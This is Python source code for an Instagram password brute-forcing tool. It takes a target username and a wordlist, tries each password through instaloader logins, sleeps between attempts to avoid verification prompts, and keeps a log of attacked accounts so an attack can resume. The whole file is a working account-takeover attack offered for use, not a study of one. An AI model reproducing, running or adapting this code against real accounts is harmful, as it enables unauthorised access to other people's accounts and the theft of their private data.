import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from src.termux2 import *
class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'

def windows():
    os.system("cls")
    start()
    L = instaloader.Instaloader()
    veri_break = "no"

    while True:
        if veri_break == "si":
            break
        ascii()
        USER = input('\nUsername: @')
        wl = input("\nWord list: ")
        try:
            sleepp = int(input("\nSleep time (seconds): "))
        except ValueError:
            print(bcolors.FAIL+"ERROR 0x2: sleep time supports only number."+bcolors.ENDC)
            exit()
        while True:
            sub.call("cls")
            ascii()
            procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
            if procedere == "y":
                veri_break = "si"
                break
            elif procedere == "modify":
                print("\nReturn...")
                break
            elif procedere == "break":
                exit()
            else:
                pass


    f = open('./src/log.txt', 'a')
    f.write(USER+"\n")
    f.close()

    try:
        file1 = open(wl, 'r')
        Lines = file1.readlines() 
        count = 0
    except FileNotFoundError:
        print(bcolors.FAIL+"ERROR 0x1: "+wl+" file not found, make sure it is in the directory."+bcolors.ENDC)
        exit()


    file1 = open('src/log.txt', 'r')
    Lines = file1.readlines()
      
    count = 0
    # Strips the newline character
    for line in Lines:
        count += 1
        if line == (USER+"\n"):
            os.system("cls")
            ascii()
            resume_input = input(bcolors.WARNING+"You have already tried to attack this account, would you like to start with the last tryed password?\n"+ "["+bcolors.OKBLUE+"y/n"+ "]: "+bcolors.ENDC)
            if resume_input == "y":
                os.system("cls")
                ascii()
                pass_resume = input("Choose password to start attack: ")
                password_count = 0
                file1 = open(wl, 'r')
                Lines = file1.readlines()
                l_count = 0
                for line in Lines:
                    l_count += 1
                    if line == (pass_resume+"\n"):
                        password_count = l_count


                break
            else:
                password_count = 0
                break

    file1 = open(wl, 'r')
    Lines = file1.readlines()
    count = 1
    os.system("cls")
    ascii()
    for line in Lines:
        if count < password_count:
            count = count+1
        else:            
            try:
                PASSWORD = ""
                count += 1
                pstest = ("{}".format(line.strip()))
                PASSWORD = pstest
                time.sleep(1)
                print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
                L.login(USER , PASSWORD)
                print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+ bcolors.OKGREEN+": "+ pstest)
                break
            except instaloader.exceptions.BadCredentialsException:
                pass
                print( "["+bcolors.FAIL+"incorrect password"+ "] "+pstest+bcolors.ENDC)
                print("sleep for "+ str(sleepp))
                time.sleep(sleepp)

            except instaloader.exceptions.ConnectionException:
                print("\n"+bcolors.FAIL+"ERROR 0x4: Instagram has been requested verification via sms, try to set more login time...")
                break

            except instaloader.exceptions.InvalidArgumentException:
                print("\n"+bcolors.FAIL+"ERROR 0x3: Username not found"+bcolors.ENDC)
